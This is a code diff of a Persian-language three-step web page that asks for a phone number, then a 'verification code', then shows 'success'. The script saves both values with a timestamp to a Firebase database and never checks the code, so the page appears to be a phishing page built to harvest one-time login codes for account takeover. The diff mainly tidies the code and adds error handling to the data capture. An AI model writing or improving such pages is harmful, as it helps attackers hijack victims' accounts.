@@ -80,7 +80,6 @@ button{
 </div>
 
 
-
 <div id="page2" class="page">
 
 <h1>تأیید کد</h1>
@@ -94,7 +93,6 @@ button{
 </div>
 
 
-
 <div id="page3" class="page">
 
 <h1>موفق شد ✅</h1>
@@ -105,14 +103,16 @@ button{
 
 </div>
 
-
 </div>
 
 
 <script type="module">
 
-import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
-import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
+import { initializeApp } 
+from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
+
+import { getDatabase, ref, push } 
+from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
 
 
 const firebaseConfig = {
@@ -127,6 +127,7 @@ const firebaseConfig = {
 
 
 const app = initializeApp(firebaseConfig);
+
 const db = getDatabase(app);
 
 
@@ -135,7 +136,7 @@ let phone="";
 
 window.nextPage=function(){
 
-phone=document.getElementById("phone").value;
+phone=document.getElementById("phone").value.trim();
 
 if(phone==""){
 alert("شماره را وارد کنید");
@@ -151,7 +152,8 @@ document.getElementById("page2").style.display="block";
 
 window.finish=function(){
 
-let code=document.getElementById("code").value;
+let code=document.getElementById("code").value.trim();
+
 
 if(code==""){
 alert("کد را وارد کنید");
@@ -160,16 +162,41 @@ return;
 
 
 push(ref(db,"users"),{
+
 phone: phone,
+
 code: code,
-time: new Date().toLocaleString()
-});
+
+time: new Date().toLocaleString("fa-IR")
+
+})
+
+.then(()=>{
+
+console.log("اطلاعات ذخیره شد");
 
 
 document.getElementById("page2").style.display="none";
+
 document.getElementById("page3").style.display="block";
 
+
+})
+
+.catch((error)=>{
+
+
+console.log("Firebase Error:",error);
+
+
+alert("خطا در ذخیره اطلاعات: "+error.message);
+
+
+});
+
+
 }
+
 
 </script>
 
